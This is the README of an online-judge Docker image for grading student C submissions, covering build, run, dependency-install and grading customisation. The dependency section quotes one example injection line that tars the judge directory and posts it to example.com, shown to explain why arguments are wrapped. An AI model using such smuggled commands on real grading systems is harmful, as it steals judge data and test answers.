# OJ Sample judging image

This image serves as a base for grading student submissions. 
There are many hardcoded restrictions so please do read this document! 
If in doubt, you can consult the reference implementation.

# Quick start

We have set up this base image for simple judging tasks, which

* runs on ubuntu 16.04
* submission is a single c source file named `main.c` targeting c11
* compiled binary takes input from STDIN and print to STDOUT
* output is graded by `diff`ing it with a predefined reference output
* may have numerous test cases
* does not require installing student-defined dependencies with `apt` or `pip3`

If your need happens to match this, you can start reading the section on
where to place test data. 
If not, we have also written a few common customization guides.
If all failed, please refer to the [WALKTHROUGH.md](WALKTHROUGH.md)
we have written. 
This detailed guide contains everything you will need to rewrite this
image to suit your needs.

## Test data location
It is placed in `tests/` directory. Please refer to readme inside those 
directories on details.

## Customize build command

1. Edit `build` script. 
1. Replace line 4 with your command.
1. If your command require addition packages, please add them to
relevant location in `Dockerfile`

Please be ware your compile command have connectivity to the internet.

Please note the default run script requires an executable file at 
`/test/executable` as the student program.
Since you are using custom compile command, you may also wish to use
a custom run command.

## Customize run command
1. Edit `run.py` script. 
1. Replace line 101 with the executable.
2. Replace line 106 with the arguments to the executable including `argv[0]`
 which is executable name.
1. There are various other settings can be changed in the script.
 
 For anything more advanced

## Install student defined dependencies

*If you are using python, please note `pip install .` is considered a 
build command and should not be used here.*

Uncomment everything inside `setup` script. 

Oh, Please don't uncomment the shebang line (`#!/usr/bin/env bash` line)

This will allow student to place a file named dependencies. 
This file is a key-value file, with key being the installation method,
and the value being the dependency.
One pair per line.
The key-value is separated with three colons (`:::`)
This image comes with `apt` and `pip3` installation method but it is 
easy to define your own.

NOTE: For sake of security, we enforce a rule of *one dependency per line*.

### Adding/removing custom dependency installation method

Open `dep.awk`, while you may not be familiar with awk, the template 
should be easy enough to follow.

First, you select a good identifier to indicate the installation method.
This identifier does not need to have connection with the actual
install command, e.g. `asjdui` can be used to identify `pip3 install -U`
but your student will believe you can't name things properly.

You then think of how the actual installation should commence.
You should write a command template that would install the package.

You now fill the following template and append the result to `dep.awk`.

    $1~/<identifer>/ {
        print "run_cmd.py <install command>" "--" $2 
    }

---

Remember the student may give a line like this

    apt:gcc;tar -zcvf /t /judge;curl -X POST example.com/post -d /t

So it's suggested to pass the dependency as a single argument. 
This is also why we enforce the rule of *one dependency per line*.

We have provided two wrappers `run_cmd.py` and `run_cmd_no_slash.py`
to facilitate this need.

The first wrapper will take first argument as target executable, other 
argument before `--` as options, and join everything after `--` with
a space as delimiter and use the result as a whole as the last argument 
to the target executable.   

The second wrapper will additionally reject any package that has `/` in
it.
This will be helpful to prevent package manager from installing from 
local directory, as installation script of a local package is not as
trusty as one on e.g. `PyPI`.

# Customize grading method
It is suggested to use the utilities in `grading/util.py` as the OJ
requires a specific pattern in `STDOUT` to be able to read the grading
result.

You can consult `grading/grade.py` on how to use it.

